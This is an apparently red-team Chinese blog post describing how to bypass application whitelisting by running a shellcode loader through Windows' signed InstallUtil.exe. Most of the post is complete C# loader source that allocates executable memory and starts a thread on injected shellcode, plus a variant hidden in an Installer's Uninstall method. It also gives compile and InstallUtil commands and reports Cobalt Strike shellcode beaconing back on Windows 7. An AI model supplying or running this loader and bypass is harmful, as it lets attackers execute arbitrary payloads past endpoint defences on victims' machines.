---
layout:     post
title:    白名单-InstallUtil的利用
subtitle:   InstallUtil的利用
date:       2020-02-01
author:     hmoytx
header-img: img/bg_02.jpg
catalog: true
tags:
    - 白名单
    - 红队
    - 内网渗透
---
# 白名单-InstallUtil的利用

## 简介
InstallUtil（安装程序工具）是一个命令行工具，你可以通过此工具执行指定程序集中的安装程序组件，从而安装和卸载服务器资源。 此工具与 System.Configuration.Install 命名空间中的类配合使用。  
需要注意的是这个工具所在的路径没有添加到系统的PATH中，所以需要给上全路径去执行。  
InstallUtil.exe路径，我测试环境是win7，win10下内存会报错不知道为什么，win7的路径是：***C:\Windows\Microsoft.NET\Framework\v4.0.30319\***。   
常用参数就4个：   
- /h 帮助  
- /LogFile=[filename] 指定在其中记录安装进度的日志文件的名称。 如果省略 /LogFile 选项，则会默认创建名为 程序名.InstallLog 的日志文件，里面包含了一些详细信息  
- /LogToConsole={true or false} 是否将日志信息输出到控制台
- /u[ninstall] 卸载指定程序集  

其他详细的可以看官方文档：[https://docs.microsoft.com/zh-cn/dotnet/framework/tools/installutil-exe-installer-tool?redirectedfrom=MSDN](https://docs.microsoft.com/zh-cn/dotnet/framework/tools/installutil-exe-installer-tool?redirectedfrom=MSDN)。  

## 测试
先写一个C#的测试代码，用来加载shellcode：  
```
using System;
using System.IO;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;


namespace RunShellCode
{
    public class shellcodeload
    {
        public static void Main()
        {
            byte[] shellcode = new byte[] { .......... }; //添加要加载的shellcode
            
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;

            // Prepare data
            IntPtr pinfo = IntPtr.Zero;

            // Invoke the shellcode
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(
            UInt32 lpStartAddr,
            UInt32 size,
            UInt32 flAllocationType,
            UInt32 flProtect
        );

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
        );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
        );
    }
}
``` 
编译的时候用csc直接编译：  
```
csc.exe  /out:1.exe 1.cs
```
如果没有问题应该是能上线的，但是有时候执行会显示 Access is denied。  
这时候可以尝试用InstallUtil来绕过。  
修改下这个代码： 
```
using System;
using System.IO;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;


namespace RunShellCode
{

    public class ABswsd
    {
        public static void Main()
        {
            Console.WriteLine("test");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class wdi2nS2dwS : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary SaveState)
        {
            Console.WriteLine("Run shellcode");
            shellcodeload.MsdwsdSAsdw();
        }
    }
    public class shellcodeload
    {
        public static void MsdwsdSAsdw()
        {
            byte[] shellcode = new byte[] { .......... }; //添加要加载的shellcode
            
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;

            // Prepare data
            IntPtr pinfo = IntPtr.Zero;

            // Invoke the shellcode
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(
            UInt32 lpStartAddr,
            UInt32 size,
            UInt32 flAllocationType,
            UInt32 flProtect
        );

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
        );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
        );
    }
}
```
同样的先编译，然后用InstallUtil安装卸载。  
```
InstallUtil.exe  /LogtoConsole=false /U 1.exe
```
可以加上/logfile=，这样不会有日志文件输出，我测试的时候为了方便排查所以加上了。   
我这里测试了加载cs的shellcode。  
win10测试失败了，内存问题。。。   
![200201_1](/img/200201_win10fail.png)  
win7下测试可以上线。  
![200201_2](/img/200201_win7.png)  

## 总结
绕来绕去其实也是个老技术，大概就是没东西写了？同文件夹下好友好几个这样用来安装注册的，后面接续写。   

## 参考
[https://micro8.github.io/Micro8-HTML/Chapter1/71-80/72_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%BA%8C%E5%AD%A3.html](https://micro8.github.io/Micro8-HTML/Chapter1/71-80/72_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%BA%8C%E5%AD%A3.html)
